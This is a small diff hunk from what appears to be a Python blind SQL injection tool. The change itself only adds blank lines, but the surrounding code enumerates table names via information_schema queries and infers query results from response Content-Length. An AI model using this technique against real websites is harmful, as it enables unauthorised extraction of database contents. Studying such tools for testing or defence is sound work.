@@ -119,6 +119,8 @@ async def report(url:str, base_query:Callable[[str],str], response_truth_conditi
         tables.append(await get_string(url, F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i], query_encoder=query_encoder))
         print(tables[i], ":", table_name_lengths[i])
     '''
+
+
 # here we specify the condition that lets us infer the result of a query from the response 
 def response_truth_condition(response): 
     content_length = int(response.headers['Content-Length'])
